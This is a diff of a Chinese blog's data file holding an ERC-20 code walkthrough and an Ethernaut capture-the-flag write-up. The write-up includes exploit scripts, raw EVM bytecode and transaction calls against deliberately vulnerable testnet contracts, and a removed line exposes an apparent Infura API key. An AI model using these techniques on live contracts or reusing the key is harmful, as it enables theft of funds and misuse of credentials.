class="line">        if (account == address(0)) &#123;</span><br><span class="line">            revert ERC20InvalidSender(address(0));</span><br><span class="line">        &#125;</span><br><span class="line">        _update(account, address(0), value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _approve(address owner, address spender, uint256 value) internal &#123;</span><br><span class="line">        // 授权额度，去调用它的一个重写，emitEvent默认传入true</span><br><span class="line">        _approve(owner, spender, value, true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual &#123;</span><br><span class="line">        // 比另一个_approve()多出一个bool参数emitEvent，用于选择是否触发Approval事件</span><br><span class="line">        if (owner == address(0)) &#123;</span><br><span class="line">            revert ERC20InvalidApprover(address(0));</span><br><span class="line">        &#125;</span><br><span class="line">        if (spender == address(0)) &#123;</span><br><span class="line">            revert ERC20InvalidSpender(address(0));</span><br><span class="line">        &#125;</span><br><span class="line">        _allowances[owner][spender] = value; // 基于spender相应代币数量的授权</span><br><span class="line">        if (emitEvent) &#123;</span><br><span class="line">            emit Approval(owner, spender, value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _spendAllowance(address owner, address spender, uint256 value) internal virtual &#123;</span><br><span class="line">        // 花费授权的额度，内部函数</span><br><span class="line">        uint256 currentAllowance = allowance(owner, spender);</span><br><span class="line">        if (currentAllowance != type(uint256).max) &#123;</span><br><span class="line">            if (currentAllowance &lt; value) &#123;</span><br><span class="line">                revert ERC20InsufficientAllowance(spender, currentAllowance, value);</span><br><span class="line">            &#125;</span><br><span class="line">            unchecked &#123;</span><br><span class="line">                _approve(owner, spender, currentAllowance - value, false);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>以上是 OpenZeppelin Contracts 的 ERC20.sol，我隐去了代码中开发者留下的详细英文注释，取而代之的是一些简洁的注释，有误敬请斧正。</p>
+<h3 id="constructor-NaN"><a href="#constructor-NaN" class="headerlink" title="constructor"></a>constructor</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">string private _name;</span><br><span class="line">string private _symbol;</span><br><span class="line"></span><br><span class="line">constructor(string memory name_, string memory symbol_) &#123;</span><br><span class="line">    _name = name_;</span><br><span class="line">    _symbol = symbol_;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>构造函数，接收<code>name_</code>和<code>symbol_</code>两个参数，初始化代币的名称和符号。</p>
+<h3 id="public-函数"><a href="#public-函数" class="headerlink" title="public 函数"></a>public 函数</h3><h4 id="name"><a href="#name" class="headerlink" title="name"></a>name</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">string private _name;</span><br><span class="line"></span><br><span class="line">function name() public view virtual returns (string memory) &#123;</span><br><span class="line">    return _name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>返回代币名称。</p>
+<h4 id="symbol"><a href="#symbol" class="headerlink" title="symbol"></a>symbol</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">string private _symbol;</span><br><span class="line"></span><br><span class="line">function symbol() public view virtual returns (string memory) &#123;</span><br><span class="line">    return _symbol;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>返回代币符号。</p>
+<h4 id="decimals"><a href="#decimals" class="headerlink" title="decimals"></a>decimals</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function decimals() public view virtual returns (uint8) &#123;</span><br><span class="line">    return 18;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>返回代币使用的小数位数。</p>
+<h4 id="totalSupply"><a href="#totalSupply" class="headerlink" title="totalSupply"></a>totalSupply</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint256 private _totalSupply;</span><br><span class="line"></span><br><span class="line">function totalSupply() public view virtual returns (uint256) &#123;</span><br><span class="line">    return _totalSupply;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>返回代币总供应量。</p>
+<h4 id="balanceOf"><a href="#balanceOf" class="headerlink" title="balanceOf"></a>balanceOf</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mapping(address account =&gt; uint256) private _balances;</span><br><span class="line"></span><br><span class="line">function balanceOf(address account) public view virtual returns (uint256) &#123;</span><br><span class="line">    return _balances[account];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>从<code>_balances</code>映射中返回相应账户的余额。</p>
+<h4 id="transfer"><a href="#transfer" class="headerlink" title="transfer"></a>transfer</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function transfer(address to, uint256 value) public virtual returns (bool) &#123;</span><br><span class="line">    address owner = _msgSender();</span><br><span class="line">    _transfer(owner, to, value);</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>转账函数，可见性为<code>public</code>，用于获取目前的<code>msg.sender</code>并将其作为<code>from</code>参数传入内部函数<code>_transfer</code>，以执行下一步转账操作。</p>
+<h4 id="allowance"><a href="#allowance" class="headerlink" title="allowance"></a>allowance</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mapping(address account =&gt; mapping(address spender =&gt; uint256)) private _allowances;</span><br><span class="line"></span><br><span class="line">function allowance(address owner, address spender) public view virtual returns (uint256) &#123;</span><br><span class="line">    return _allowances[owner][spender];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>从<code>_allowances</code>映射中返回相应授权者账户和被授权账户的授权额。</p>
+<h4 id="approve"><a href="#approve" class="headerlink" title="approve"></a>approve</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function approve(address spender, uint256 value) public virtual returns (bool) &#123;</span><br><span class="line">    address owner = _msgSender();</span><br><span class="line">    _approve(owner, spender, value);</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>授权函数，可见性为<code>public</code>，用于获取目前的<code>msg.sender</code>并将其作为<code>owner</code>参数传入内部函数<code>_approve</code>，以执行下一步授权操作。</p>
+<h4 id="transferFrom"><a href="#transferFrom" class="headerlink" title="transferFrom"></a>transferFrom</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function transferFrom(address from, address to, uint256 value) public virtual returns (bool) &#123;</span><br><span class="line">    address spender = _msgSender();</span><br><span class="line">    _spendAllowance(from, spender, value);</span><br><span class="line">    _transfer(from, to, value);</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>使用授权的代币进行转账，获取当前<code>msg.sender</code>作为<code>spender</code>参数传入内部函数<code>_spendAllowance</code>，执行成功后再调用<code>_transfer</code>内部函数转移代币。</p>
+<h3 id="internal-函数"><a href="#internal-函数" class="headerlink" title="internal 函数"></a>internal 函数</h3><h4 id="transfer-1"><a href="#transfer-1" class="headerlink" title="_transfer"></a>_transfer</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _transfer(address from, address to, uint256 value) internal &#123;</span><br><span class="line">    if (from == address(0)) &#123;</span><br><span class="line">        revert ERC20InvalidSender(address(0));</span><br><span class="line">    &#125;</span><br><span class="line">    if (to == address(0)) &#123;</span><br><span class="line">        revert ERC20InvalidReceiver(address(0));</span><br><span class="line">    &#125;</span><br><span class="line">    _update(from, to, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>内部函数，判断<code>from</code>和<code>to</code>是否为空地址，是则<code>revert</code>，否则调用内部函数<code>_update</code>，执行下一步转账操作。</p>
+<h4 id="update"><a href="#update" class="headerlink" title="_update"></a>_update</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _update(address from, address to, uint256 value) internal virtual &#123;</span><br><span class="line">    if (from == address(0)) &#123;</span><br><span class="line">        _totalSupply += value;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        uint256 fromBalance = _balances[from];</span><br><span class="line">        if (fromBalance &lt; value) &#123;</span><br><span class="line">            revert ERC20InsufficientBalance(from, fromBalance, value);</span><br><span class="line">        &#125;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            _balances[from] = fromBalance - value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (to == address(0)) &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            _totalSupply -= value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            _balances[to] += value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    emit Transfer(from, to, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>代币转移的核心代码，内部函数。第一个 if 中判断<code>from</code>是否为空地址，是则凭空产生代币，另一个内部函数<code>_mint</code>会这样调用它。else 中是既不产生代币也不销毁代币的正常转账，判断<code>fromBalance</code>足够即可转账。第二个 if 中判断<code>to</code>是否为空地址，是则销毁代币，另一个内部函数<code>_burn</code>会这样调用它。执行完代币转移的操作后，触发一个 Transfer 事件。</p>
+<h4 id="mint"><a href="#mint" class="headerlink" title="_mint"></a>_mint</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _mint(address account, uint256 value) internal &#123;</span><br><span class="line">    if (account == address(0)) &#123;</span><br><span class="line">        revert ERC20InvalidReceiver(address(0));</span><br><span class="line">    &#125;</span><br><span class="line">    _update(address(0), account, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>内部函数，用于凭空在一个账户的余额中生成代币，传入的账户为空地址则 revert，否则直接去调用<code>_update</code>。</p>
+<h4 id="burn"><a href="#burn" class="headerlink" title="_burn"></a>_burn</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _burn(address account, uint256 value) internal &#123;</span><br><span class="line">    if (account == address(0)) &#123;</span><br><span class="line">        revert ERC20InvalidSender(address(0));</span><br><span class="line">    &#125;</span><br><span class="line">    _update(account, address(0), value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>内部函数，用于销毁一个账户中的代币余额，传入的账户地址为空地址则 revert，否则直接去调用<code>_update</code>。</p>
+<h4 id="approve-1"><a href="#approve-1" class="headerlink" title="_approve"></a>_approve</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _approve(address owner, address spender, uint256 value) internal &#123;</span><br><span class="line">    _approve(owner, spender, value, true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual &#123;</span><br><span class="line">    if (owner == address(0)) &#123;</span><br><span class="line">        revert ERC20InvalidApprover(address(0));</span><br><span class="line">    &#125;</span><br><span class="line">    if (spender == address(0)) &#123;</span><br><span class="line">        revert ERC20InvalidSpender(address(0));</span><br><span class="line">    &#125;</span><br><span class="line">    _allowances[owner][spender] = value;</span><br><span class="line">    if (emitEvent) &#123;</span><br><span class="line">        emit Approval(owner, spender, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>内部函数，用于将<code>owner</code>的一定量代币授权给<code>spender</code>，有两种用法，目的是使<code>emitEvent</code>缺省为 true。</p>
+<h4 id="spendAllowance"><a href="#spendAllowance" class="headerlink" title="_spendAllowance"></a>_spendAllowance</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _spendAllowance(address owner, address spender, uint256 value) internal virtual &#123;</span><br><span class="line">    uint256 currentAllowance = allowance(owner, spender);</span><br><span class="line">    if (currentAllowance != type(uint256).max) &#123;</span><br><span class="line">        if (currentAllowance &lt; value) &#123;</span><br><span class="line">            revert ERC20InsufficientAllowance(spender, currentAllowance, value);</span><br><span class="line">        &#125;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            _approve(owner, spender, currentAllowance - value, false);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>内部函数，当被授权者使用<code>transferFrom</code>函数，转移其被授权的代币时被调用，用于扣除其相应的授权额度。</p>
+]]></content>
+      <categories>
+        <category>区块链</category>
+      </categories>
+      <tags>
+        <tag>solidity</tag>
+      </tags>
   </entry>
   <entry>
     <title>Ethernaut WP _持续更新中。。。</title>
@@ -626,7 +626,7 @@
 </tr>
 </tbody></table>
 <p>经过对各个变量所用存储空间的计算，data[2] 存储于 slot5，上 python 脚本读吧。</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"></span><br><span class="line">w3 = Web3(Web3.WebsocketProvider(<span class="string">&#x27;wss://sepolia.infura.io/ws/v3/5d13483fc1bf41359bbea6404e3bbc66&#x27;</span>))</span><br><span class="line"><span class="comment"># print(w3.is_connected())</span></span><br><span class="line"><span class="built_in">print</span>(w3.eth.get_storage_at(<span class="string">&#x27;0xDFA42F31cea9d624a9E794D809894D39b4F1fcA9&#x27;</span>, <span class="number">5</span>).<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"></span><br><span class="line">w3 = Web3(Web3.HTTPProvider(<span class="string">&#x27;https://rpc.sepolia.org&#x27;</span>))</span><br><span class="line"><span class="comment"># print(w3.is_connected())</span></span><br><span class="line"><span class="built_in">print</span>(w3.eth.get_storage_at(<span class="string">&#x27;0xDFA42F31cea9d624a9E794D809894D39b4F1fcA9&#x27;</span>, <span class="number">5</span>).<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure></div>
 
 <p>输出：</p>
 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">root@fatbee-laptop:/mnt/c/Users/13246/web3<span class="comment"># python py/hack_12.py</span></span><br><span class="line">0x6b6077ff2045271ed9c281d35cb5762eebd69455f990d6d1677c384638a0c72b</span><br></pre></td></tr></table></figure></div>
@@ -646,7 +646,7 @@
 <li>Remember what you’ve learned from the Telephone and Token levels.</li>
 <li>You can learn more about the special function <code>gasleft()</code>, in Solidity’s documentation (see <a class="link"   href="https://docs.soliditylang.org/en/v0.8.3/units-and-global-variables.html" >here <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and <a class="link"   href="https://docs.soliditylang.org/en/v0.8.3/control-structures.html#external-function-calls" >here <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>).</li>
 </ul>
-<h3 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h3><p>合约里面有三个函数修改器，满足这三个修改器里面的断言才能成功执行 enter 函数，那么沿着这些条件倒推就能找出 _gateKey 的值了。</p>
+<h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><p>合约里面有三个函数修改器，满足这三个修改器里面的断言才能成功执行 enter 函数，那么沿着这些条件倒推就能找出 _gateKey 的值了。</p>
 <p>关于 <a class="link"   href="https://docs.soliditylang.org/en/latest/types.html#conversions-between-elementary-types" >Solidity 类型转换 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
 <p><strong>gateThree_3</strong>：</p>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GG&quot;);</span><br></pre></td></tr></table></figure></div>
@@ -783,7 +783,7 @@
 <li>The <code>assembly</code> keyword in the second gate allows a contract to access functionality that is not native to vanilla Solidity. See <a class="link"   href="http://solidity.readthedocs.io/en/v0.4.23/assembly.html" >here <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> for more information. The <code>extcodesize</code> call in this gate will get the size of a contract’s code at a given address - you can learn more about how and when this is set in section 7 of the <a class="link"   href="https://ethereum.github.io/yellowpaper/paper.pdf" >yellow paper <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</li>
 <li>The <code>^</code> character in the third gate is a bitwise operation (XOR), and is used here to apply another common bitwise operation (see <a class="link"   href="http://solidity.readthedocs.io/en/v0.4.23/miscellaneous.html#cheatsheet" >here <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>). The Coin Flip level is also a good place to start when approaching this challenge.</li>
 </ul>
-<h3 id="Analyze-1"><a href="#Analyze-1" class="headerlink" title="Analyze"></a>Analyze</h3><p><strong>gateOne</strong>：</p>
+<h3 id="Analysis-1"><a href="#Analysis-1" class="headerlink" title="Analysis"></a>Analysis</h3><p><strong>gateOne</strong>：</p>
 <p>这题的 gateOne 与上一关相同。</p>
 <p><strong>gateTwo</strong>：</p>
 <p>gateTwo 中使用了内联汇编，功能是获取调用者的代码大小，判断其为0才能通过。题目叫我去看内联汇编和黄皮书，看看先：</p>
@@ -822,7 +822,7 @@
 <li>The <a class="link"   href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md" >ERC20 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> Spec</li>
 <li>The <a class="link"   href="https://github.com/OpenZeppelin/zeppelin-solidity/tree/master/contracts" >OpenZeppelin <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> codebase</li>
 </ul>
-<h3 id="Analyze-2"><a href="#Analyze-2" class="headerlink" title="Analyze"></a>Analyze</h3><p>题目是一个 ERC-20 标准的代币合约，其继承于 OppenZepplin Contracts 的 ERC20 合约，其解析见 <a href="/2023/12/03/%E6%B5%85%E6%9E%90ERC-20">浅析ERC-20</a>。</p>
+<h3 id="Analysis-2"><a href="#Analysis-2" class="headerlink" title="Analysis"></a>Analysis</h3><p>题目是一个 ERC-20 标准的代币合约，其继承于 OppenZepplin Contracts 的 ERC20 合约，其解析见 <a href="/2023/12/03/%E6%B5%85%E6%9E%90ERC-20">浅析ERC-20</a>。</p>
 <p>题目要求要把我们手里的余额花完，但是修改器<code>lockTokens</code>检测到<code>msg.sender</code>为玩家时会判断时间戳，要十年后才能解锁。但是当 sender 不是玩家的时候就会直接执行 transfer 了。</p>
 <p>看完 ERC-20 就知道可以把自己账户中的余额授权给另一个账户以供使用，这样就可以使 sender 不是玩家，绕过修改器。</p>
 <h3 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit"></a>Exploit</h3><p>python 攻击脚本如下：</p>
@@ -852,7 +852,7 @@
 <li>Understanding how storage variables are stored and accessed.</li>
 <li>Understanding how casting works between different data types.</li>
 </ul>
-<h3 id="Analyze-3"><a href="#Analyze-3" class="headerlink" title="Analyze"></a>Analyze</h3><p>题目中给我们强调了<code>delegatecall</code>的属性，这里我们需要知道，当使用委托调用去调用目标合约的函数时，使用的是调用者合约的存储空间，而不是被调用者合约的存储空间。</p>
+<h3 id="Analysis-3"><a href="#Analysis-3" class="headerlink" title="Analysis"></a>Analysis</h3><p>题目中给我们强调了<code>delegatecall</code>的属性，这里我们需要知道，当使用委托调用去调用目标合约的函数时，使用的是调用者合约的存储空间，而不是被调用者合约的存储空间。</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
@@ -885,7 +885,7 @@
 
 <h3 id="Description-4"><a href="#Description-4" class="headerlink" title="Description"></a>Description</h3><p>A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent <code>0.001</code> ether to obtain more tokens. They have since lost the contract address.</p>
 <p>This level will be completed if you can recover (or remove) the <code>0.001</code> ether from the lost contract address.</p>
-<h3 id="Analyze-4"><a href="#Analyze-4" class="headerlink" title="Analyze"></a>Analyze</h3><p>这题要我们恢复第一个代币合约的创建者给出的 0.001ETH，应该是找到这个代币合约然后调用它的 destroy 就好。从生成代币的合约中找不到任何东西的，这里要用以太坊浏览器查看交易记录，找到对应的代币合约和 creator。使用 etherscan.io 这么个以太坊浏览器，首先查看题目给到的题目合约地址：</p>
+<h3 id="Analysis-4"><a href="#Analysis-4" class="headerlink" title="Analysis"></a>Analysis</h3><p>这题要我们恢复第一个代币合约的创建者给出的 0.001ETH，应该是找到这个代币合约然后调用它的 destroy 就好。从生成代币的合约中找不到任何东西的，这里要用以太坊浏览器查看交易记录，找到对应的代币合约和 creator。使用 etherscan.io 这么个以太坊浏览器，首先查看题目给到的题目合约地址：</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
@@ -900,7 +900,7 @@
                       alt="image-20231206115936652"
                 ></p>
 <p>这些东西都找到了，那么利用代币合约自带的 destroy 函数就能把 ETH 返还给 creator 了。</p>
-<p>Like this：</p>
+<h3 id="Expoit"><a href="#Expoit" class="headerlink" title="Expoit"></a>Expoit</h3><p>Like this：</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
@@ -927,7 +927,7 @@
 <p>The solver’s code needs to be really tiny. Really reaaaaaallly tiny. Like freakin’ really really itty-bitty tiny: 10 opcodes at most.</p>
 <p>Hint: Perhaps its time to leave the comfort of the Solidity compiler momentarily, and build this one by hand O_o. That’s right: Raw EVM bytecode.</p>
 <p>Good luck!</p>
-<h3 id="Analyze-5"><a href="#Analyze-5" class="headerlink" title="Analyze"></a>Analyze</h3><p>终于，要手搓字节码了吗？</p>
+<h3 id="Analysis-5"><a href="#Analysis-5" class="headerlink" title="Analysis"></a>Analysis</h3><p>终于，要手搓字节码了吗？</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
@@ -941,7 +941,265 @@
 <p>42是“生命、宇宙和万物的终极问题”的答案，这是道格拉斯·亚当斯（Douglas Adams）1979年小说《银河系漫游指南》（The Hitchhiker’s Guide to the Galaxy）中的一个笑话。</p>
 </blockquote>
 <p>好好好，玩洋梗捏，鼠鼠我呀，看不懂呢。</p>
-<p>回到正题，题目应该是要求我们部署一个合约，其要求是拥有一个函数<code>whatIsTheMeaningOfLife()</code>并能返回数字42，且函数操作码数量限制在10个以内。</p>
+<p>回到正题，题目应该是要求我们部署一个合约，其要求是能返回数字42，且操作码数量限制在10个以内。</p>
+<p>那么就需要去学习一下关于 EVM 字节码的知识，以及字节码是如何组成一个合约的。</p>
+<p><a class="link"   href="https://www.evm.codes/" >An Ethereum Virtual Machine Opcodes Interactive Reference <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   href="https://blog.openzeppelin.com/deconstructing-a-solidity-contract-part-i-introduction-832efd2d7737" >Deconstructing a Solidity Contract —Part I: Introduction <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>现在我们知道构建一个合约的功能需要有 Runtime Opcodes，而部署它需要有 Initialization Opcodes，我们先来构造 Runtime：</p>
+<table>
+<thead>
+<tr>
+<th>字节码</th>
+<th>操作码</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>602a</td>
+<td>PUSH1 0x2a</td>
+<td>value 要写入内存的32字节值（数字42）</td>
+</tr>
+<tr>
+<td>6080</td>
+<td>PUSH1 0x80</td>
+<td>offset 要写入内存的偏移量</td>
+</tr>
+<tr>
+<td>52</td>
+<td>MSTORE</td>
+<td>MSTORE(offset, value)</td>
+</tr>
+<tr>
+<td>6020</td>
+<td>PUSH1 0x20</td>
+<td>size 要返回的数据大小</td>
+</tr>
+<tr>
+<td>6080</td>
+<td>PUSH1 0x80</td>
+<td>offset 数据在内存中的偏移量</td>
+</tr>
+<tr>
+<td>f3</td>
+<td>RETURN</td>
+<td>RETURN(offset, size)</td>
+</tr>
+</tbody></table>
+<p>602a60805260206080f3</p>
+<p>这里就是我们合约所需的功能，具体是将数字42存入内存中，就可以返回该数字了。</p>
+<p>部署合约所需的 Initialization Opcodes：</p>
+<table>
+<thead>
+<tr>
+<th>字节码</th>
+<th>操作码</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>600a</td>
+<td>PUSH1 0x0a</td>
+<td>size 要复制的字节数量（Runtime Opcodes长度10字节）</td>
+</tr>
+<tr>
+<td>60??</td>
+<td>PUSH1 0x??</td>
+<td>offset 要复制的代码的偏移量</td>
+</tr>
+<tr>
+<td>6000</td>
+<td>PUSH1 0x00</td>
+<td>destOffset 要复制到内存中的目标偏移量</td>
+</tr>
+<tr>
+<td>39</td>
+<td>CODECOPY</td>
+<td>CODECOPY(destOffset, offset, size)</td>
+</tr>
+<tr>
+<td>600a</td>
+<td>PUSH1 0x0a</td>
+<td>size 要返回的数据大小（Runtime Opcodes长度10字节）</td>
+</tr>
+<tr>
+<td>6000</td>
+<td>PUSH1 0x00</td>
+<td>offset 数据在内存中的偏移量</td>
+</tr>
+<tr>
+<td>f3</td>
+<td>RETURN</td>
+<td>将 Runtime Opcodes 返回给 EVM</td>
+</tr>
+</tbody></table>
+<p>600a60??600039600a6000f3</p>
+<p>部署合约的字节码后面加上它的 Runtime Opcodes，就可以部署一个合约，所以我们部署合约所需的字节码是：</p>
+<p>600a60??600039600a6000f3602a60805260206080f3</p>
+<p>可以看到在上面一段字节码中，Runtime Opcodes 的偏移量为12，即0x0c，那么在 Initialization Opcodes 中用问号代替的值就是0c，全部的字节码如下：</p>
+<p>600a600c600039600a6000f3602a60805260206080f3</p>
+<h3 id="Exploit-4"><a href="#Exploit-4" class="headerlink" title="Exploit"></a>Exploit</h3><p>直接使用 web3.js 部署合约：</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> <span class="title function_">sendTransaction</span>(&#123;</span><br><span class="line">    <span class="attr">from</span>: player,</span><br><span class="line">    <span class="attr">data</span>: 600a600c600039600a6000f3602a60805260206080f3</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202401061527430.png"
+                      alt="image-20240106152718373"
+                ></p>
+<p>上以太坊浏览器查看，得到部署的合约地址 0xCf86935aA103893Cf4513f589D76078Ce8da24bb：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202401061529478.png"
+                      alt="image-20240106152947414"
+                ></p>
+<p>调用题目合约的 setSolver 方法即可：</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">setSolver</span>(<span class="string">&quot;0xCf86935aA103893Cf4513f589D76078Ce8da24bb&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202401061533314.png"
+                      alt="image-20240106153318261"
+                ></p>
+<h2 id="19-Alien-Codex"><a href="#19-Alien-Codex" class="headerlink" title="19 Alien Codex"></a>19 Alien Codex</h2><h3 id="Code-6"><a href="#Code-6" class="headerlink" title="Code"></a>Code</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">import &quot;../helpers/Ownable-05.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract AlienCodex is Ownable &#123;</span><br><span class="line">    bool public contact;</span><br><span class="line">    bytes32[] public codex;</span><br><span class="line"></span><br><span class="line">    modifier contacted() &#123;</span><br><span class="line">        assert(contact);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function makeContact() public &#123;</span><br><span class="line">        contact = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function record(bytes32 _content) public contacted &#123;</span><br><span class="line">        codex.push(_content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function retract() public contacted &#123;</span><br><span class="line">        codex.length--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function revise(uint256 i, bytes32 _content) public contacted &#123;</span><br><span class="line">        codex[i] = _content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Description-6"><a href="#Description-6" class="headerlink" title="Description"></a>Description</h3><p>You’ve uncovered an Alien contract. Claim ownership to complete the level.</p>
+<p> Things that might help</p>
+<ul>
+<li>Understanding how array storage works</li>
+<li>Understanding <a class="link"   href="https://solidity.readthedocs.io/en/v0.4.21/abi-spec.html" >ABI specifications <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li>Using a very <code>underhanded</code> approach</li>
+</ul>
